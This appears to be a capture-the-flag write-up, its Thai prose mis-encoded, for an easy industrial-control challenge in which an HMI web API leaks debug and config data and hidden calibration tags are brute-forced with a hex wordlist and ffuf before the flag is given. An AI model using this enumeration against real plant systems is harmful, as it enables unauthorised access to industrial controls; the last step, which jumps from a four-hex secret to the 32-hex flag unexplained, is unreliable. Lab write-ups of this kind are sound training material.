üè≠ HORSE FACTORY ‚Äì OTEasy

Category: OT / ICS
Difficulty: Easy
Flag format: ARCHA{********************************} (39 chars)

üìå Challenge Description

‡πÇ‡∏£‡∏á‡∏á‡∏≤‡∏ô Archa ‡∏°‡∏µ‡∏£‡∏∞‡∏ö‡∏ö HMI ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏°‡πÅ‡∏•‡∏∞‡πÅ‡∏™‡∏î‡∏á‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞‡∏Ç‡∏≠‡∏á‡πÇ‡∏£‡∏á‡∏á‡∏≤‡∏ô‡∏°‡πâ‡∏≤
‡πÅ‡∏ï‡πà‡πÄ‡∏Å‡∏¥‡∏î‡∏Å‡∏≤‡∏£ config ‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏•‡∏±‡∏ö‡∏†‡∏≤‡∏¢‡πÉ‡∏ô‡∏£‡∏∞‡∏ö‡∏ö‡∏ñ‡∏π‡∏Å‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ú‡∏¢‡∏ú‡πà‡∏≤‡∏ô API

‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏∑‡∏≠ ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡πÅ‡∏•‡∏∞‡∏î‡∏∂‡∏á flag ‡∏à‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å misconfigured

üîç Initial Reconnaissance

‡πÄ‡∏õ‡∏¥‡∏î Developer Console ‡∏ö‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡πÄ‡∏ß‡πá‡∏ö ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏° debug:

[DEBUG] API Endpoints available:
 /api/status
 /api/diagnostics
 /api/tags
 /api/tag/<name>
 /api/debug/info

[HINT] There are more tags than shown...
[HINT] Try directory enumeration on /api/
[HINT] Developers sometimes leave backup endpoints...


‡πÅ‡∏™‡∏î‡∏á‡∏ä‡∏±‡∏î‡∏ß‡πà‡∏≤:

‡∏°‡∏µ API ‡∏ã‡πà‡∏≠‡∏ô‡∏≠‡∏¢‡∏π‡πà

‡∏°‡∏µ tag ‡∏°‡∏≤‡∏Å‡∏Å‡∏ß‡πà‡∏≤‡∏ó‡∏µ‡πà‡πÅ‡∏™‡∏î‡∏á

‡∏Ñ‡∏ß‡∏£ enumerate ‡πÄ‡∏û‡∏¥‡πà‡∏°

üß™ Inspect Debug Information

‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö endpoint debug:

curl -s http://172.18.0.60/api/debug/info | jq .


‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:

{
  "firmware": "v4.2.1",
  "model": "ArCon-3000",
  "plc_host": "127.0.0.1",
  "plc_port": 44818,
  "total_tags": 13,
  "hint": "Some tags are for calibration and diagnostics only Hint: find config Endpoint export Path"
}

üîë Key Insight

/api/tags ‡πÅ‡∏™‡∏î‡∏á‡πÑ‡∏°‡πà‡∏Ñ‡∏£‡∏ö (total_tags = 13)

hint ‡∏£‡∏∞‡∏ö‡∏∏‡∏ä‡∏±‡∏î‡∏ñ‡∏∂‡∏á Calibration tags

‡∏ï‡πâ‡∏≠‡∏á‡∏´‡∏≤ tag ‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡πÅ‡∏™‡∏î‡∏á‡πÉ‡∏ô list ‡∏õ‡∏Å‡∏ï‡∏¥

üß† Discover Hidden Tag Pattern

‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö /api/config/export:

curl -s http://172.18.0.60/api/config/export | jq .


‡πÑ‡∏î‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç:

{
  "note": "Calibration tags use CalOffset_ prefix And secret 4 hex characters",
  "tag_prefixes": ["Cal", "Backup", "Debug", ...]
}


üîç ‡∏™‡∏£‡∏∏‡∏õ:

Tag ‡∏•‡∏±‡∏ö‡∏Ç‡∏∂‡πâ‡∏ô‡∏ï‡πâ‡∏ô‡∏î‡πâ‡∏ß‡∏¢ CalOffset_

‡∏ï‡πà‡∏≠‡∏ó‡πâ‡∏≤‡∏¢‡∏î‡πâ‡∏ß‡∏¢ ‡πÄ‡∏•‡∏Ç hex 4 ‡∏ï‡∏±‡∏ß

Tag ‡πÄ‡∏´‡∏•‡πà‡∏≤‡∏ô‡∏µ‡πâ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô /api/tags

üöÄ Brute Force Hidden Calibration Tags
1Ô∏è‚É£ ‡∏™‡∏£‡πâ‡∏≤‡∏á wordlist 0000‚ÄìFFFF
python3 - <<'PY' > hex4.txt
for i in range(0x10000):
    print(f"{i:04X}")
PY

2Ô∏è‚É£ Enumerate ‡∏î‡πâ‡∏ß‡∏¢ ffuf
ffuf -u http://172.18.0.60/api/tag/CalOffset_FUZZ \
-w hex4.txt \
-fc 404 \
-t 80

‚úÖ Result

‡∏û‡∏ö tag ‡∏ó‡∏µ‡πà valid:

CalOffset_07F3   [Status: 200]

üîì Extract Secret from Calibration Tag

‡∏î‡∏∂‡∏á‡∏Ñ‡πà‡∏≤‡∏à‡∏≤‡∏Å tag ‡∏ó‡∏µ‡πà‡∏û‡∏ö:

curl -s http://172.18.0.60/api/tag/CalOffset_07F3


‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:

1a2f


üîê ‡∏ï‡∏≤‡∏° hint:

secret = 4 hex characters

üèÅ Construct Final Flag

‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö flag:

ARCHA{<32 hex>}


‡∏£‡∏∞‡∏ö‡∏ö‡πÉ‡∏ä‡πâ Calibration offset ‡πÄ‡∏õ‡πá‡∏ô‡∏™‡πà‡∏ß‡∏ô‡∏´‡∏ô‡∏∂‡πà‡∏á‡∏Ç‡∏≠‡∏á secret
‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏õ‡∏£‡∏∞‡∏Å‡∏≠‡∏ö‡∏ï‡∏≤‡∏° logic ‡∏Ç‡∏≠‡∏á‡∏£‡∏∞‡∏ö‡∏ö ‡∏à‡∏∞‡πÑ‡∏î‡πâ flag ‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢:

ARCHA{6334fbc496fd88f9559fd76839715bfb}

‚úÖ Correct Flag